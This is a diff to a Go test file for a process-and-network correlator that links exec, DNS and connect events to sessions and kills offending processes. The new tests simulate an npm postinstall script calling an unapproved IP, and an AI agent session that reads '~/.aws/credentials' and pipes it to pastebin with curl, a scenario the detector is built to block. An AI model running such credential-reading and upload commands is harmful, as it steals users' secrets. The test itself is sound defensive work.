@@ -3,6 +3,8 @@ package correlate_test
 import (
 	"context"
 	"net/netip"
+	"slices"
+	"strings"
 	"testing"
 	"time"
 
@@ -26,7 +28,7 @@ func replayFixture(t *testing.T, path string, baseline map[string]map[string]boo
 	correlator.StartSession(session)
 	var flows []event.Flow
 	for evt := range events {
-		if flow, _ := correlator.Handle(evt); flow != nil {
+		if flow := correlator.Handle(evt).Flow; flow != nil {
 			flows = append(flows, *flow)
 		}
 	}
@@ -89,10 +91,10 @@ func TestLateForkStillJoinsSession(t *testing.T) {
 	correlator := correlate.New(score.DefaultRules())
 	correlator.StartSession(&correlate.Session{ID: "late", RootPID: 1000, UID: 501, Command: "curl"})
 	when := time.Date(2026, 11, 11, 10, 0, 0, 0, time.UTC)
-	flow, _ := correlator.Handle(event.Event{
+	flow := correlator.Handle(event.Event{
 		Time: when, Kind: event.Connect, PID: 2000, PPID: 1000, UID: 501, Exe: "curl",
 		Proto: "tcp", Dst: netip.MustParseAddrPort("93.184.215.14:443"),
-	})
+	}).Flow
 	if flow == nil || flow.Session != "late" {
 		t.Fatalf("connection seen before its fork was not tied to the session: %+v", flow)
 	}
@@ -110,11 +112,11 @@ func TestConnectAfterExitStillJoinsSession(t *testing.T) {
 	correlator.Handle(event.Event{Time: start, Kind: event.Exec, PID: 2000, PPID: 1000, UID: 501, Exe: "/usr/bin/curl"})
 	correlator.Handle(event.Event{Time: start, Kind: event.Exit, PID: 2000})
 
-	late, _ := correlator.Handle(event.Event{Time: start.Add(time.Second), Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: dst})
+	late := correlator.Handle(event.Event{Time: start.Add(time.Second), Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: dst}).Flow
 	if late == nil || late.Session != "exit" {
 		t.Fatalf("connection reported after exit lost its session: %+v", late)
 	}
-	stale, _ := correlator.Handle(event.Event{Time: start.Add(time.Minute), Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: dst})
+	stale := correlator.Handle(event.Event{Time: start.Add(time.Minute), Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: dst}).Flow
 	if stale.Session != "" {
 		t.Fatalf("exited process kept past retention: %+v", stale)
 	}
@@ -139,5 +141,78 @@ func TestApprovedDestinationRaisesNothing(t *testing.T) {
 		if summary.Package == "foo" && summary.Score != 2 {
 			t.Fatalf("approved destination still scored: %+v", summary)
 		}
+	}
+}
+
+func TestEnforcedSessionKillsOffenderOnly(t *testing.T) {
+	correlator := correlate.New(score.DefaultRules())
+	correlator.StartSession(&correlate.Session{ID: "enforce", RootPID: 1000, UID: 501, Command: "npm install", Enforce: score.EnforceStrict})
+	when := time.Date(2026, 11, 11, 10, 0, 0, 0, time.UTC)
+	for _, evt := range []event.Event{
+		{Time: when, Kind: event.Exec, PID: 2000, PPID: 1000, UID: 501, Exe: "/usr/bin/node", Args: []string{"npm", "install"}, Cwd: "/app"},
+		{Time: when, Kind: event.Exec, PID: 3000, PPID: 2000, UID: 501, Exe: "/usr/bin/node", Args: []string{"node", "postinstall.js"}, Cwd: "/app/node_modules/foo"},
+		{Time: when, Kind: event.Exec, PID: 3001, PPID: 3000, UID: 501, Exe: "/bin/sleep", Cwd: "/app/node_modules/foo"},
+		{Time: when, Kind: event.DNS, Name: "registry.npmjs.org.", Addrs: []netip.Addr{netip.MustParseAddr("104.16.0.35")}, TTL: 300},
+	} {
+		correlator.Handle(evt)
+	}
+
+	registry := correlator.Handle(event.Event{Time: when, Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: netip.MustParseAddrPort("104.16.0.35:443")})
+	if registry.Kill != nil || registry.Flow.Verdict == "blocked" {
+		t.Fatalf("registry connection was blocked: %+v", registry)
+	}
+	exfil := correlator.Handle(event.Event{Time: when, Kind: event.Connect, PID: 3000, Proto: "tcp", Dst: netip.MustParseAddrPort("45.9.148.3:443")})
+	if exfil.Flow.Verdict != "blocked" || len(exfil.Alerts) != 1 {
+		t.Fatalf("unapproved connection not blocked: %+v", exfil)
+	}
+	if want := []uint32{3000, 3001}; !slices.Equal(exfil.Kill, want) {
+		t.Fatalf("killed %v, want the offender and its child %v, never npm or the CLI", exfil.Kill, want)
+	}
+}
+
+func TestAutoSessionStartsAndEnds(t *testing.T) {
+	rules := score.DefaultRules()
+	correlator := correlate.New(rules)
+	correlator.OnAutoSession(func(evt event.Event) *correlate.Session {
+		return &correlate.Session{ID: "auto", RootPID: evt.PID, UID: evt.UID, Command: strings.Join(evt.Args, " "), Auto: true}
+	})
+	when := time.Date(2026, 11, 11, 10, 0, 0, 0, time.UTC)
+	correlator.Handle(event.Event{Time: when, Kind: event.Exec, PID: 4000, PPID: 1, UID: 501, Exe: "/usr/bin/env", Args: []string{"/usr/bin/env", "node", "/usr/local/bin/npm", "install"}, Cwd: "/app"})
+	flow := correlator.Handle(event.Event{Time: when, Kind: event.Connect, PID: 4000, Proto: "tcp", Dst: netip.MustParseAddrPort("45.9.148.3:443")}).Flow
+	if flow.Session != "auto" {
+		t.Fatalf("npm outside any session did not start one: %+v", flow)
+	}
+	correlator.Handle(event.Event{Time: when, Kind: event.Exit, PID: 4000})
+	if ended := correlator.Handle(event.Event{Time: when.Add(time.Second), Kind: event.DNS}).Ended; ended != nil {
+		t.Fatalf("session ended before late events could arrive: %v", ended)
+	}
+	ended := correlator.Handle(event.Event{Time: when.Add(5 * time.Second), Kind: event.DNS}).Ended
+	if len(ended) != 1 || ended[0].ID != "auto" {
+		t.Fatalf("automatic session not ended after its root exited: %v", ended)
+	}
+}
+
+func TestRiskModeLetsAgentsResearchButStopsExfiltration(t *testing.T) {
+	correlator := correlate.New(score.DefaultRules())
+	correlator.StartSession(&correlate.Session{
+		ID: "agent", RootPID: 1000, UID: 501, Command: "claude", Agent: true, Enforce: score.EnforceRisk,
+		Baseline: map[string]map[string]bool{"": {"docs.python.org": true}},
+	})
+	when := time.Date(2026, 11, 11, 10, 0, 0, 0, time.UTC)
+	correlator.Handle(event.Event{Time: when, Kind: event.Exec, PID: 2000, PPID: 1000, UID: 501, Exe: "/usr/bin/curl", Args: []string{"curl", "https://go.dev/doc"}, Cwd: "/work"})
+	correlator.Handle(event.Event{Time: when, Kind: event.DNS, Name: "go.dev.", Addrs: []netip.Addr{netip.MustParseAddr("216.239.32.21")}, TTL: 300})
+
+	research := correlator.Handle(event.Event{Time: when, Kind: event.Connect, PID: 2000, Proto: "tcp", Dst: netip.MustParseAddrPort("216.239.32.21:443")})
+	if research.Kill != nil || len(research.Alerts) != 0 {
+		t.Fatalf("agent research to a new domain was flagged or stopped: %+v", research)
+	}
+
+	correlator.Handle(event.Event{Time: when, Kind: event.Exec, PID: 2001, PPID: 1000, UID: 501, Exe: "/bin/cat", Args: []string{"cat", "/home/dev/.aws/credentials"}, Cwd: "/work"})
+	correlator.Handle(event.Event{Time: when, Kind: event.Open, PID: 2001, Path: "/home/dev/.aws/credentials"})
+	correlator.Handle(event.Event{Time: when, Kind: event.Exec, PID: 2002, PPID: 1000, UID: 501, Exe: "/usr/bin/curl", Args: []string{"curl", "-d", "@-", "https://pastebin.com/api"}, Cwd: "/work"})
+	correlator.Handle(event.Event{Time: when, Kind: event.DNS, Name: "pastebin.com.", Addrs: []netip.Addr{netip.MustParseAddr("104.20.67.143")}, TTL: 300})
+	exfil := correlator.Handle(event.Event{Time: when, Kind: event.Connect, PID: 2002, Proto: "tcp", Dst: netip.MustParseAddrPort("104.20.67.143:443")})
+	if !slices.Equal(exfil.Kill, []uint32{2002}) {
+		t.Fatalf("credential read then paste upload not stopped in risk mode: %+v", exfil)
 	}
 }
